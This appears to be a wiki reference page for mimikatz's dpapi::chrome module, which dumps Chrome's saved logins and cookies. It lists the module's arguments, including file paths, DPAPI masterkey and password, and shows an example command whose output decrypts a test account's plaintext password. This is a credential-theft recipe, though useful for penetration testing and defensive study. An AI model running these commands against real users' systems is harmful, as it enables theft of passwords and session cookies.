# chrome

`dpapi::chrome` dumps stored credentials and cookies from Chrome. (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad-ds/movement/credentials/dumping/dpapi-protected-secrets)) It has the following command line arguments:

* `in`: the `C:\Users\<UserName>\AppData\Local\Google\Chrome\User Data\Default\Login Data` for the saves logins and the `C:\Users<UserName>\AppData\Local\Google\Chrome\User Data\Default\Cookies` for the cookies
* `key`: it is the _**key**_ output value of the `dpapi::masterkey in:"C:\Users\<UserName>\AppData\Roaming\Microsoft\Protect\SID\MasterKey_ID" /rpc`. it is useful for offline dumping of Chrome. CoreSecurity has published an excellent [guide](https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz) on how this can be accomplished offline
* `state`: TODO
* `encryptedkey`: TODO
* `/password`: the user's password to use for decryption
* `/masterkey`: the masterkey to use for decryption. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi).
* `/unprotect`: display the decryption results on screen

```
mimikatz # dpapi::chrome /in:"C:\Users\m3g9tr0n\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * volatile cache: GUID:{5c22983f-77ee-41e4-9086-8073d664e417};KeyHash:850247e2dd89c50536c05bdcee1a56c395e752cf;Key:available
 * masterkey     : 3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
> AES Key is: fd0635bf2e19d76231f649f48f4a90df3de80d3f83aa5ad016b3155fdab37fa2

URL     : https://login.live.com/ ( https://login.live.com/login.srf )
Username: mytestmail@hotmail.com
 * using BCrypt with AES-256-GCM
Password: MySecretPass
```
